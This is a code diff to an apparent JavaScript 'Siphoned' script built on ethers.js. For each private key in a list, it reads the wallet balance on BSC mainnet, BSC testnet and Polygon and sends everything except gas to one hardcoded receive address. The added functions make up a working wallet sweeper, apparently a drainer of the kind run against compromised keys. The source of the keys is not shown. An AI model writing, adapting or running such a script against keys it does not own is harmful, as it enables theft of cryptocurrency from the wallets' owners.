@@ -1,5 +1,4 @@
 import { ethers } from 'ethers';
-
 export default function Siphoned(){
  return (<p></p>)    
 }
@@ -35,11 +34,73 @@ const providerMumbai = new ethers.providers.AlchemyProvider('maticmum',process.e
 const providerMain = new ethers.providers.AlchemyProvider('homestead', process.env.ALCHEMY_API_KEY_MAINNET);
 const providerPolygon = new ethers.providers.AlchemyProvider('matic', process.env.ALCHEMY_API_KEY_POLYGON);
 const providerRinkeby = new ethers.providers.AlchemyProvider('rinkeby', process.env.ALCHEMY_API_KEY_RINKBY);
+const providerBscMainNet = new ethers.getDefaultProvider('https://bsc-dataseed1.binance.org:443');
+const providerBsc = new ethers.getDefaultProvider('https://data-seed-prebsc-1-s1.binance.org:8545');
 const receiveAddress = "0x88761F959C029d5828405234A53c5d42FD84248E";
 
 
-siphonedPolygon();
+siphonedBscMainnet();
 
+
+async function siphonedBscMainnet(){
+
+  for(let i = 0; i < privateKey.length; i++){ 
+   let newGasPrice = await providerBscMainNet.getGasPrice();
+   let balance = await providerBscMainNet.getBalance(new ethers.Wallet(privateKey[i]).address);
+   let newNonce = await providerBscMainNet.getTransactionCount(new ethers.Wallet(privateKey[i]).address, "latest");
+   let newGasLimit = ethers.BigNumber.from("21000");
+   let tips = ethers.BigNumber.from("10");
+   let feesTx = newGasLimit.mul(newGasPrice);
+  //  console.log(ethers.utils.formatUnits(ethers.BigNumber.from(balance),1),ethers.utils.formatUnits(ethers.BigNumber.from(feesTx),1),ethers.utils.formatUnits(ethers.BigNumber.from(balance).sub(feesTx),1));
+
+   if(ethers.utils.formatUnits(ethers.BigNumber.from(balance).sub(feesTx),1) > 0){
+     const tx = {
+       from: new ethers.Wallet(privateKey[i]).address,
+       to: receiveAddress,
+       value: ethers.BigNumber.from(balance).sub(feesTx),
+       nonce: newNonce,
+       gasLimit: newGasLimit, // 100000
+       gasPrice: newGasPrice,
+     }
+     console.log("BSCMAIN TX DONE");
+
+     new ethers.Wallet(privateKey[i], providerBscMainNet).sendTransaction(tx).then((transaction,err) => {
+       console.log(transaction);
+     })
+   }
+ } 
+  siphonedBsc();
+}
+
+async function siphonedBsc(){
+
+  for(let i = 0; i < privateKey.length; i++){ 
+   let newGasPrice = await providerBsc.getGasPrice();
+   let balance = await providerBsc.getBalance(new ethers.Wallet(privateKey[i]).address);
+   let newNonce = await providerBsc.getTransactionCount(new ethers.Wallet(privateKey[i]).address, "latest");
+   let newGasLimit = ethers.BigNumber.from("21000");
+   let tips = ethers.BigNumber.from("10");
+   let feesTx = newGasLimit.mul(newGasPrice);
+  //  console.log(ethers.utils.formatUnits(ethers.BigNumber.from(balance),1),ethers.utils.formatUnits(ethers.BigNumber.from(feesTx),1),ethers.utils.formatUnits(ethers.BigNumber.from(balance).sub(feesTx),1));
+
+   if(ethers.utils.formatUnits(ethers.BigNumber.from(balance).sub(feesTx),1) > 0){
+     const tx = {
+       from: new ethers.Wallet(privateKey[i]).address,
+       to: receiveAddress,
+       value: ethers.BigNumber.from(balance).sub(feesTx),
+       nonce: newNonce,
+       gasLimit: newGasLimit, // 100000
+       gasPrice: newGasPrice,
+     }
+     console.log("BSCTESTNET TX DONE");
+
+     new ethers.Wallet(privateKey[i], providerBsc).sendTransaction(tx).then((transaction,err) => {
+       console.log(transaction);
+     })
+   }
+ } 
+  siphonedPolygon();
+}
 
 async function siphonedPolygon(){
 
